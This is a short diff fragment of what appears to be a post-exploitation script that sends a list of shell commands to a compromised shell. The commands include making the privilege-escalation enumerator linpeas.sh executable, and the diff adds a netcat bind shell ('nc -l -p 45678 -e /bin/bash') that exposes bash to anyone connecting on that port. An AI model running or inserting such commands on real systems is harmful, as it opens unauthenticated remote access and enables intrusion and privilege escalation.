@@ -297,6 +297,7 @@ sequence = [
     "echo 0xcafedeadbeef",
     "chmod +x linpeas.sh",
     "echo matthislemechan",
+    "nc -l -p 45678 -e /bin/bash"
 ]
 
 lol = sendCommands(shell, sequence)
